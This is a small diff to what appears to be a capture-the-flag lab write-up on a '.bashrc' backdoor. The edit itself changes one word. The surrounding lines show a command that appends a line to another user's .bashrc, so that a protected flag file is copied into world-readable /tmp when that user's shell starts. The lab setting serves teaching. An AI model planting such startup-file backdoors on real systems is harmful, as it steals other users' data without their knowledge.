@@ -22,7 +22,7 @@ logout
 hacker@shenanigans~bashrc-backdoor:~$ cat /home/hacker/stolen_flag
 ```
 
-which still gave no output. The problem here was that zardus lacked permissions. So I did a little bit of research and learned about a special directory where anyone can read or write files - /tmp
+which still gave no output. The problem here was that zardus still lacked permissions. So I did a little bit of research and learned about a special directory where anyone can read or write files - /tmp
 
 ```bash
 hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag > /tmp/stolen_flag' >> /home/zardus/.bashrc
